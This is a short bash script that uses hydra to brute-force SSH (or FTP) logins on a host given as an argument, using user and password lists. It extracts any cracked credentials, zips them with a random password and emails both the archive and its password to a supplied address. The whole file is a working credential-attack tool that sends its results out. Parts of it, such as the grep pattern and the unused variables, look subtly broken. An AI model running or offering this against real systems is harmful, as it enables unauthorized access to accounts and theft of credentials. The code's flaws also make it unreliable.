#!/bin/bash
# hydra brute force https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/
#
a=$1
b=$2
# change SSH to FTP as needed
hydra -t 4 -L users.txt -P passwords.txt $1 ssh -o fp.txt
cat fp.txt | grep  'host\login\password' > foundpass.txt
sed -i '1i HYDRA Brute Force Results for '$1'\n-------------------------------' foundpass.txt
pass=$(openssl rand -base64 6)
zip --password ${pass} hydrapass.zip fp.txt foundpass.txt
echo " Your password for "$1" hydrapass.zip is "${pass}" " | mail -s "Your hydrapass.zip Info" $2
echo " Hydra Brute Forcing " | mail -s " Found Users and Passwords for "$1" " -A hydrapass.zip $2
